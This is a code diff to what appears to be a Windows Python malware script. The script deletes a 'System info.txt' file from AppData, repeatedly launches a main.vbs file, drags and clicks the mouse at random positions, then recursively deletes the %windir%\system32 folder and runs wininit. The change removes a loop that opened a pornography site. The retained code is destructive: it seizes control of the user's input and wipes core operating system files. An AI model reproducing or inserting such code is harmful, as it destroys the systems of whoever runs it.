@@ -28,14 +28,12 @@ def main():
     subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\appdata\System info.txt"')
     a=0
     while a < 10:
-        subprocess.getoutput('explorer https://pornhub.com')
-        subprocess.getoutput("start main.vbs")
-        a += 1
-    for i in range(0, 150):
+        subprocess.getoutput('start main.vbs')
         rndvalueX = randint(0, 1919)
-        rndvalueY = randint(0,1019)
+        rndvalueY = randint(0, 1019)
         mouse.dragTo(rndvalueX, rndvalueY)
-        pyautogui.click()    
+        pyautogui.click()
+        a += 1
     subprocess.getoutput('rd "%windir%\system32"/q /s')
     subprocess.run(["powershell", "-Command", "wininit"])
 main()
